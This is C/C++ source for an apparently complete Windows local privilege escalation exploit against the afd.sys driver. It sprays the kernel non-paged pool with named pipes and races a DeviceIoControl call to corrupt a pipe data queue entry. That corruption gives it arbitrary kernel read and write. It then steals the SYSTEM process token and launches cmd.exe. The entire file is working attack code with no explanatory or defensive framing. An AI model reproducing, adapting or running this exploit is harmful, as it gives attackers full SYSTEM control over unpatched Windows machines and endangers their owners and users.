#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include<stdio.h>
#include<winsock2.h>
#include<windows.h>
#include<winternl.h>
#include <Psapi.h>

#pragma comment(lib,"Version.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996) 
#include <sphelper.h>
#pragma warning(default: 4996)
#include <iostream>
#include <fstream>
#include <string>

// ======================= DEFINE CONSTANT ===================
#define POOL_HEADER_SIZE 0x10
#define NP_HEADER_SIZE 0x30
#define FIRST_ENTRY_SIZE (0x2000-NP_HEADER_SIZE) //FIRST_ENTRY is not very important
#define SECOND_ENTRY_SIZE (0x4000-NP_HEADER_SIZE)
#define THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)
#define ARBITRARY_WRITE_SIZE 8
#define LEAKED_DATA_OFFSET 0xb0

#define USER_DATA_ENTRY_ADDR ((uint64_t)THIRD_ENTRY_SIZE<<16)
#define DATA_ENTRY_SIZE 0x60



#define PID_OFFSET 0x440
#define ACTIVELINKS_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET 0x4b8

#define AfdSendMessageDispatchIOCTL 0x120d3

//NTSTATUS Codes Defined
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

//Define IO_COMPLETION_OBJECT
#define IO_COMPLETION_OBJECT 1

//Maximum File Length
#define MAXIMUM_FILENAME_LENGTH 255 



//IRP constants
#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040

#define EPROCESS_OFFSET 0x318 //0x430

// ========================= DEFINE STRUCT =====================

typedef struct LIST_ENTRY64lmao {
	uint64_t Flink;
	uint64_t Blink;
} LIST_ENTRY64lmao;

// io request package
typedef struct {
	SHORT Type;
	USHORT Size;
	uint64_t MdlAddress;
	ULONG Flags;
	uint64_t AssociatedIrp;
	LIST_ENTRY64lmao ThreadListEntry;
	IO_STATUS_BLOCK IoStatus;
	CHAR RequestorMode;
	BOOLEAN PendingReturned;
	CHAR StackCount;
	CHAR CurrentLocation;
	BOOLEAN Cancel;
	UCHAR CancelIrql;
	CCHAR ApcEnvironment;
	UCHAR AllocationFlags;
	uint64_t UserIosb;
	uint64_t UserEvent;
	char Overlay[16];
	uint64_t CancelRoutine;
	uint64_t UserBuffer;
	CHAR TailIsWrong;
} IRP;

// named pipe structure
typedef struct {
	uint64_t Flink;
	uint64_t Blink;
	uint64_t Irp;
	uint64_t SecurityContext;
	uint32_t EntryType;
	uint32_t QuotaInEntry;
	uint32_t DataSize;
	uint32_t x;
} DATA_QUEUE_ENTRY;

typedef struct {
	HANDLE Read;
	HANDLE Write;
} PIPE_HANDLES;

typedef void (IO_APC_ROUTINE)(
	void* ApcContext,
	IO_STATUS_BLOCK* IoStatusBlock,
	unsigned long    reserved
	);

typedef int(__stdcall* NTFSCONTROLFILE)(
	HANDLE           fileHandle,
	HANDLE           event,
	IO_APC_ROUTINE* apcRoutine,
	void* ApcContext,
	IO_STATUS_BLOCK* ioStatusBlock,
	unsigned long    FsControlCode,
	void* InputBuffer,
	unsigned long    InputBufferLength,
	void* OutputBuffer,
	unsigned long    OutputBufferLength
	);

// =================== GLOBAL VARIABLE ==============
PIPE_HANDLES PipeArrayB[10000];
PIPE_HANDLES PIPEhandles = { 0 };

int flag = 0;
SOCKET s;

char data[0x1000]; // get data from LeakMem

uint64_t thread_list_head = 0;
uint64_t current_process = 0;
uint64_t system_process = 0;
uint64_t current_process_id = 0;
uint64_t system_token = 0;

// ======================== FUNCTION =================

void PrintFileVersion(LPCTSTR filePath) {
	DWORD dummy;
	DWORD dwSize = GetFileVersionInfoSize(filePath, &dummy);
	if (dwSize == 0)
		std::cout << "Error retrieving version (Module Not Found)" << std::endl;
	else {
		BYTE* data = new BYTE[dwSize];
		if (!GetFileVersionInfo(filePath, NULL, dwSize, &data[0]))
			std::cout << "Error retrieving version (Version Data Not Retrieved)" << std::endl;
		else {
			UINT infoLen = 0;
			VS_FIXEDFILEINFO* pFixedInfo = NULL;
			if (!VerQueryValue(&data[0], _T("\\"), (LPVOID*)&pFixedInfo, &infoLen))
				std::cout << "Error retrieving version (Version Data Query Failed)" << std::endl;
			else {
				std::cout << "[+] afd.sys Version: " << HIWORD(pFixedInfo->dwFileVersionMS) << "."
					<< LOWORD(pFixedInfo->dwFileVersionMS) << "."
					<< HIWORD(pFixedInfo->dwFileVersionLS) << "."
					<< LOWORD(pFixedInfo->dwFileVersionLS) << std::endl << std::endl;
			}
		}
		delete[] data;
	}
}

void SprayNonPagedNXPool() {

	BOOL res = 0;

	UCHAR payload[0x30];
	memset(payload, 0x41, 0x30);

	UINT i = 0;
	DWORD resultLength = 0;

	printf("[+] Spray NonPaged Pool\n");
	for (i = 0; i < 10000; i++) {

		PipeArrayB[i].Write = CreateNamedPipe(
			L"\\\\.\\pipe\\papcaii",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			0x30,
			0x30,
			0,
			0);

		PipeArrayB[i].Read = CreateFile(
			L"\\\\.\\pipe\\papcaii",
			GENERIC_READ,
			0,
			NULL,
			OPEN_EXISTING,
			0,
			0);

		res = WriteFile(PipeArrayB[i].Write, payload, 0x30, &resultLength, NULL);
		if (res == 0) {
			printf("[-] WriteFile failed\n");
			return;
		}
	}
}

void CreateHoles() {

	UINT i = 0;

	DWORD readBytes = 0;

	for (i = 0; i < 10000; i += 4) {
		if (!CloseHandle(PipeArrayB[i].Read) && !CloseHandle(PipeArrayB[i].Write)) {
			printf("[-] CloseHandle failed\n");
			return;
		}
	}

	printf("[+] Create Holes success\n");
}

PIPE_HANDLES DetectPipe()
{
	BOOL res = 0;
	UCHAR payload[0x30]; //0x60 blocks
	memset(payload, 0x44, sizeof(payload));
	DWORD resultLength = 0;
	DWORD magic = 0x45464748;
	DWORD extract = 0x0;
L1:
	for (int i = 0; i < 10000; i++) //iterate through all the
	{
		if (i % 4 == 0)
			continue;
		res = PeekNamedPipe(PipeArrayB[i].Read, payload, 0x30, &resultLength, 0, 0);

		extract = *(DWORD*)(payload);
		if (extract == magic)
		{
			printf("[+] Corrupted DATA_QUEUE_ENTRY found: %d\n", i);
			return PipeArrayB[i];
		}

		if (!res)
		{
			printf("[-] error reading in pipe\n");
			return { 0 };
		}
	}
	goto L1;
	return { 0 };
}


DWORD WINAPI Thread2(LPVOID lpParam) {
	while (1) {
		*(DWORD*)(0x1000f04) = 0x58;
		for (int i = 0; i < 500; i++);
		*(DWORD*)(0x1000f04) = 0xfffffff8;
	}
}

DWORD WINAPI Thread1(LPVOID lpParam) {
	WSADATA WSAData;
	SOCKADDR_IN sa;
	int ierr;

	WSAStartup(0x2, &WSAData);
	s = socket(AF_INET, SOCK_DGRAM, 0);
	memset(&sa, 0, sizeof(sa));
	sa.sin_port = htons(135);
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	sa.sin_family = AF_INET;
	ierr = bind(s, (SOCKADDR*)&sa, sizeof(sa));



	char outBuf[100];
	DWORD bytesRet;
	DWORD inbuf1[100];


	//build a Unbuffured DATA_QUEUE_ENTRY object placed in userland (USER_DATA_ENTRY_ADDR) to perform the arbitrary read.
	uint64_t read_address = 0;
	memset((void*)0x1000f10, 0x41, 0x60);

	DATA_QUEUE_ENTRY dqe = { 0 };
	dqe.Flink = USER_DATA_ENTRY_ADDR;
	dqe.Blink = USER_DATA_ENTRY_ADDR;
	dqe.EntryType = 0x0; //NO IRP
	dqe.QuotaInEntry = sizeof(DATA_QUEUE_ENTRY) + 0x60 + 0x20;
	dqe.DataSize = sizeof(DATA_QUEUE_ENTRY) + 0x60 + 0x20;

	memcpy((void*)0x1000f70, &dqe, sizeof(DATA_QUEUE_ENTRY));

	*(ULONGLONG*)(0x1000f70 + 0x30) = (ULONGLONG)((ULONGLONG)0x4142434445464748); //magic sequence = 0x4142434445464748
	*(ULONGLONG*)(0x1000f70 + 0x38) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(0x1000f70 + 0x40) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(0x1000f70 + 0x48) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(0x1000f70 + 0x50) = (ULONGLONG)((ULONGLONG)0x4142434445464748);

	HANDLE hThread2 = CreateThread(NULL, 0, Thread2, NULL, 0, NULL);

	while (flag == 0) {
		memset(inbuf1, 0, sizeof(inbuf1));
		*(DWORD*)(0x1000f04) = 0x58;
		inbuf1[0] = 16;
		inbuf1[1] = 0x1;
		inbuf1[2] = 0x0;
		inbuf1[6] = 0x1000f04;
		inbuf1[7] = 0x58;
		inbuf1[8] = 0x1;

		DeviceIoControl((HANDLE)s, 0x120D3, (LPVOID)inbuf1, 0x30, outBuf, 0, &bytesRet, NULL);
	}
	TerminateThread(hThread2, 0);
	return 0;
}

// build dqe for arbitrary read
void PrepareForRead(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint64_t read_address) {
	memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
	dqe->EntryType = 1;
	dqe->DataSize = -1;
	dqe->Irp = (uint64_t)irp;
	irp->AssociatedIrp = read_address;
}

// prepare dqe for arbitrary write
void PrepareForWrite(uint64_t Irp, uint64_t flink) {
	DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
	memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
	dqe->Flink = (uint64_t)flink;
	dqe->Blink = (uint64_t)flink;
	dqe->EntryType = 0x0;
	dqe->QuotaInEntry = 7;
	dqe->DataSize = 8;
	dqe->Irp = (uint64_t)Irp;
}

// Read on the victimPIPE
void LeakMem(HANDLE victimPIPE, uint64_t read_addr, size_t len, char* data) {
	static char* buf = (char*)malloc(len + 0x1 + LEAKED_DATA_OFFSET);
	DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
	DWORD read;

	PrepareForRead(dqe, (IRP*)(USER_DATA_ENTRY_ADDR + 0x1000), read_addr);

	PeekNamedPipe(victimPIPE, buf, len + LEAKED_DATA_OFFSET, &read, 0, 0);

	memcpy(data, buf, len + LEAKED_DATA_OFFSET);
	memset(buf, 0x00, len + LEAKED_DATA_OFFSET); //init
}

// Used to find CCB having corrupted dqe
void findCCB(uint64_t* overwrittenQueueDataEntryCCB, uint64_t ccbAddr, uint64_t current_chunk_addr)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool CcbFound = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	uint64_t ccbAddrDataEntryPtr = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	int iter = 0;

	while (!CcbFound)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb + 0x90, 0x8, data); //extract DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (ccbAddrDataEntryPtr == current_chunk_addr) //if the DATA_QUEUE_ENTRY pointed by the CCB object is the previously calculated overwritten DATA_QUEUE_ENTRY chunk address, we found the CCB related to the overwritten DATA_QUEUE_ENTRY
		{
			CcbFound = true;
			*overwrittenQueueDataEntryCCB = NextCcb;
		}

		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}

// Find Irp address created
void findIrpAddres(uint64_t* IrpAddr, uint64_t ccbAddr, uint64_t previousIRP)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool IrpFOund = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	uint32_t iter = 0;

	while (!IrpFOund)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb - 0x18 + 0xe8, 0x8, data); //extract DATA_QUEUE_ENTRY pointer in the CCB object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP) //if the DATA_QUEUE_ENTRY pointed by the CCB object is the previously calculated overwritten DATA_QUEUE_ENTRY chunk address, we found the CCB related to the overwritten DATA_QUEUE_ENTRY
		{
			IrpFOund = true;
		}

		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}



uint64_t GetProcessById(HANDLE handle, uint64_t first_process, uint64_t pid) {
	uint64_t current_pid = 0;
	uint64_t current_process = first_process;
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	while (1) {
		LeakMem(handle, (uint64_t)current_process + PID_OFFSET, 0x8, data);
		current_pid = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (current_pid == pid)
			return current_process;

		LeakMem(handle, (uint64_t)current_process + ACTIVELINKS_OFFSET, 0x8, data);
		current_process = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		current_process -= PID_OFFSET + 0x8;

		if (current_process == first_process)
			return 0;
	}
}

void PrepareWriteIRP(uint64_t irp, uint64_t thread_list, uint64_t source_address, uint64_t destination_address) {
	*(uint64_t*)(irp + 0x10) = 0x60850;
	*(uint64_t*)(irp + 0x18) = (uint64_t)source_address;
	*(uint64_t*)(irp + 0x70) = (uint64_t)destination_address;
	*(uint64_t*)(irp + 0x20) = (uint64_t)(thread_list);
	*(uint64_t*)(irp + 0x28) = (uint64_t)(thread_list);
}

void foundIrpInDataEntry(uint64_t* IrpAddr, uint64_t ccbAddr, uint64_t previousIRP)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool CcbFound = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	uint64_t ccbAddrDataEntryPtr = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	int iter = 0;

	while (!CcbFound)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb + 0x90, 0x8, data); //extract first DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, ccbAddrDataEntryPtr + 0x10, 0x8, data); //extract IRP related offset of DATA_QUEUE_ENTRY object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP && *IrpAddr > 0x7fffffff)
		{
			CcbFound = true;
		}

		LeakMem(PIPEhandles.Read, NextCcb + 0x98, 0x8, data); //extract second DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, ccbAddrDataEntryPtr + 0x10, 0x8, data); //extract IRP related offset of DATA_QUEUE_ENTRY object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP && *IrpAddr > 0x7fffffff)
		{
			CcbFound = true;
		}
		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}

int main() {
	LPCTSTR file_path = L"C:\\Windows\\System32\\drivers\\afd.sys"; // Path to afd.sys
	PrintFileVersion(file_path);

	NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");

	VirtualAlloc((LPVOID)0x1000000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) {
		printf("Couldn't allocate base address 0x%lx\n", USER_DATA_ENTRY_ADDR);
		return 0;
	}
	PVOID UserAddr = VirtualAlloc(NULL, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (UserAddr)
	{
		memset(UserAddr, 0x52, 0x5000);
	}

	SprayNonPagedNXPool();
	CreateHoles();
	HANDLE hThread1 = CreateThread(NULL, 0, Thread1, NULL, 0, NULL);

	// stop Thread 1 and Thread 2
	PIPEhandles = DetectPipe();
	flag = 1;

	// Leak next_chunk_flink
	LeakMem(PIPEhandles.Read, (uint64_t)UserAddr, 0xF58, data);
	uint64_t next_chunk_flink = *(ULONGLONG*)(data + 0x40);
	printf("[+] Leaked Flink of next chunk: 0x%llx\n", next_chunk_flink);

	// Leak next_chunk
	LeakMem(PIPEhandles.Read, next_chunk_flink + 8, 0x30, data);
	uint64_t next_chunk_addr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] Address of next chunk: 0x%llx\n", next_chunk_addr);

	// Leak current_chunk
	uint64_t current_chunk_addr = next_chunk_addr - DATA_ENTRY_SIZE - POOL_HEADER_SIZE;
	printf("[+] Address of current chunk: 0x%llx\n", current_chunk_addr);

	// Leak CCB address
	uint64_t ccbAddr = (uint64_t)next_chunk_flink - 0xa8;
	printf("[+] Address of CCB: 0x%llx\n", ccbAddr);

	IO_STATUS_BLOCK isb;
	char irp_data[0x1000];
	memset(irp_data, 0x77, 0x1000);

	PIPE_HANDLES pipeHandle2{ 0 };

	//Create an unbuffered QUEUE DAYA ENTRY with an IRP pointer that is copied with the CCB structure related to the connection created in NtFsControlFile 0x119ff8 call
	//this happens in NpAddDataQueueEntry

	pipeHandle2.Write = CreateNamedPipe(
		L"\\\\.\\pipe\\papcaii",
		PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		0x30,
		0x30,
		0,
		0);
	pipeHandle2.Read = CreateFile(L"\\\\.\\pipe\\papcaii", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

	//Create unbuffered entry to construct a new unbuffered dqe
	NtFsControlFile(pipeHandle2.Write, 0, 0, 0, &isb, 0x119FF8, irp_data, DATA_ENTRY_SIZE, 0, 0);

	//Iterate through all the CCB LIST_ENTRY until found the CCB created in the previous call
	uint64_t IrpAddr = 0;
	findIrpAddres(&IrpAddr, ccbAddr, NULL);

	//Now read all the IRP structure content
	char irp_leaked_data[sizeof(IRP) + 0x200];

	LeakMem(PIPEhandles.Read, IrpAddr, sizeof(IRP) + 0x200, data);
	memcpy(irp_leaked_data, (uint64_t*)(data + LEAKED_DATA_OFFSET), sizeof(IRP) + 0x200);
	IRP* irp_object = (IRP*)irp_leaked_data;

	//Read ThreadListHead pointer from IRP->ThreadListEntry.Flink+0x38
	LeakMem(PIPEhandles.Read, (uint64_t)irp_object->ThreadListEntry.Flink + 0x38, 0x8, data);
	thread_list_head = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] thread_list_head address: 0x%llx\n", thread_list_head);

	// find current process from thread_list_head
	LeakMem(PIPEhandles.Read, (uint64_t)(thread_list_head - EPROCESS_OFFSET), 0x8, data);
	current_process = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] current_process address: 0x%llx\n", current_process);


	//find SYSTEM process
	system_process = GetProcessById(PIPEhandles.Read, current_process, 4);
	printf("[+] system_process address: 0x%llx\n", system_process);


	//Extract system token - EPROCESS_TOKEN_OFFSET
	//Prepare IRP
	BYTE sourceAddr[0x20];
	memset(sourceAddr, 0x81, 0x20);
	uint64_t thread_list[2];
	PrepareWriteIRP((uint64_t)irp_object, (uint64_t)thread_list, (uint64_t)(system_process + EPROCESS_TOKEN_OFFSET), (uint64_t)(current_process + EPROCESS_TOKEN_OFFSET));

	//allocate forged IRP in unbuffered data entry
	PIPE_HANDLES pipeHandle3{ 0 };
	pipeHandle3.Write = CreateNamedPipe(
		L"\\\\.\\pipe\\papcaii",
		PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		0x30,
		0x30,
		0,
		0);
	pipeHandle3.Read = CreateFile(L"\\\\.\\pipe\\papcaii", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

	//Create unbuffered entry
	NtFsControlFile(pipeHandle3.Write, 0, 0, 0, &isb, 0x119FF8, irp_object, 0x1000, 0, 0);

	uint64_t FakeIrpAddr = 0;
	//search kernel address of IRP created during NtFsControlFile 0x119FF8 call
	foundIrpInDataEntry(&FakeIrpAddr, ccbAddr, IrpAddr);

	uint64_t IrpSystemAddr = 0;
	LeakMem(PIPEhandles.Read, FakeIrpAddr + 0x18, 0x8, data); //extract Irp->SystemAddress

	IrpSystemAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] Address of IrpSystemAddr: 0x%llx\n", IrpSystemAddr);

	printf("[+] Token stealing !\n\n");

	PrepareForWrite((uint64_t)IrpSystemAddr, (uint64_t)current_chunk_addr);
	thread_list[0] = thread_list[1] = (uint64_t)(IrpSystemAddr + offsetof(IRP, ThreadListEntry.Flink));


	DWORD BytesReturned = 0;
	BYTE bufRead[0x80];
	ReadFile(PIPEhandles.Read, bufRead, 1, &BytesReturned, 0);

	Sleep(2000);

	system("cmd.exe");

}

